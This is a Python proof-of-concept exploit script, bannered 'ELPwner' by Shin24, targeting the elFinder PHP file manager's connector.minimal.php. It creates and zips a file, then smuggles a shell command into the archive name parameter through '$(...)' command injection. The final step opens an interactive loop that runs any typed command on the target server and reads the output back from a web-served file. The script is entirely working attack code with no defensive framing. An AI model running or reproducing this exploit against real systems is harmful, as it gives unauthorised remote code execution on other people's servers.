import requests
import sys 

def create_new_file(target):
    print("[+] Creating a.txt...")
    r = requests.get(target + "/php/connector.minimal.php?cmd=mkfile&name=a.txt&target=l1_Lw")
    if r.status_code == 200:
        print("[+] File created!")
        return True 
    else: 
        print("[-] File create failed!")
        return False

def zip_file(target):
    print("[+] zipping a.txt...")
    r = requests.get(target + "/php/connector.minimal.php?cmd=archive&name=a.txt.zip&target=l1_Lw&targets[]=l1_YS50eHQ&type=application/zip")
    if r.status_code == 200:
        print("[+] File zipped!")
        return True 
    else: 
        print("[-] File zipping failed!")
        return False

def execute_last_state(target):
    print("[+] Executing last state...")
    r = requests.get(target + "/php/connector.minimal.php?cmd=archive&name=-TmTT=\"$(uname>test555.txt)foooo\".zip&target=l1_Lw&targets[]=l1_YS50eHQuemlw&targets[]=l1_YS50eHQuemlw&type=application/zip")
    confirmation_r = requests.get(target + "files/test555.txt")
    if r.status_code == 200 and confirmation_r.status_code == 200:
        print("[+] PoC successful! Spawning shell...")
        while True:
            cmd = input("[shell] ==> ")
            r = requests.get(target + f"/php/connector.minimal.php?cmd=archive&name=-TmTT=\"$({cmd}>test555.txt)foooo\".zip&target=l1_Lw&targets[]=l1_YS50eHQuemlw&targets[]=l1_YS50eHQuemlw&type=application/zip")
            result = requests.get(target + "files/test555.txt")
            print(result.text)
    else: 
        print("[-] PoC failed!")
        return False


def main():
    print("""
    
___________.____   __________                             
\_   _____/|    |  \______   \__  _  ______   ___________ 
 |    __)_ |    |   |     ___/\ \/ \/ /    \_/ __ \_  __ \\
 |        \|    |___|    |     \     /   |  \  ___/|  | \/
/_______  /|_______ \____|      \/\_/|___|  /\___  >__|   
        \/         \/                     \/     \/       
                                                Shin24
        """)
    if len(sys.argv) == 2:
        target = sys.argv[1]
        if target[-1:] != "/":
            target += "/"
        file_created = create_new_file(target)
        if file_created:
            file_zipped = zip_file(target)
            if file_zipped:
                execute_last_state(target)
    else:
        print("python poc.py http://localhost/")

main()
